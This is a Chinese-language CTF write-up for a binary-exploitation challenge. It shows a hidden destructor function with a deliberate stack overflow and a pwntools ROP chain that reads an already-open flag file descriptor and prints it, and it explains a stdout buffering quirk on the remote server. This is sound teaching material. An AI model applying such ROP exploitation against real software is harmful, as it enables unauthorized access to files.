此題沒有附上 source code，單純是要考為 function 加上 `__attribute__((destructor))` 的屬性後，該 function 就會在 `_dl_fini()` 時被呼叫：

``` c
static void fini() __attribute__((destructor));
static void fini()
{
    uint16_t flag[] = {0x2f00, 0x6800, 0x6f00, 0x6d00, 0x6500, 0x2f00, 0x6800, 0x6500, 0x6c00, 0x6c00, 0x6f00, 0x2d00,
                        0x7700, 0x6f00, 0x7200, 0x6c00, 0x6400, 0x2f00, 0x6600, 0x6c00, 0x6100, 0x6700, 0x0000};
    unsigned char owo[23] = {0};

    for (int i = 0; i < 23; i++)
        owo[i] = flag[i] >> 8;
    
    int fd = open(owo, O_RDONLY);
    if (fd == -1)
        return;

    char s[0x10] = {0};
    read(0, s, 1);
    if (s[0] == '\xff')
        read(0, s, 0x200);
}
```



當知道有這個 function 的存在後，直接做 ROP 執行 `read(3, buf, <large_number>) + puts(buf)` 後跳回 `main()`，讓他執行 `fflush()` 將 output buffer 清空即可，ROP payload 如下：

```python
rop = flat(
    # read(3, bss, <large_number>)
    rop_pop_rdi_ret, 3,
    rop_pop_rsi_r15_ret, bss, 0,
    plt_read,
    
    # puts(bss)
    rop_pop_rdi_ret, bss,
    plt_puts,
    
    main # will call fflush(stdout)
)
```



這邊遇到滿多人詢問為什麼在 remote 時 flag 不會輸出，原因在於根據環境的不同，buffer type 也有可能不太一樣，剛好這支程式在 remote 時 buffer type 為 `_IOFBF` (Full buffering)，資料滿的時候才會清空並印出，跟 local 時的 buffer type `_IOLBF` (Line buffering) 並不相同，因此在 remote 才需要透過 `fflush(stdout)` 清空 stdout 的 buffer。



[full exploit and source code](https://github.com/u1f383/Software-Security-2021/tree/master/quals)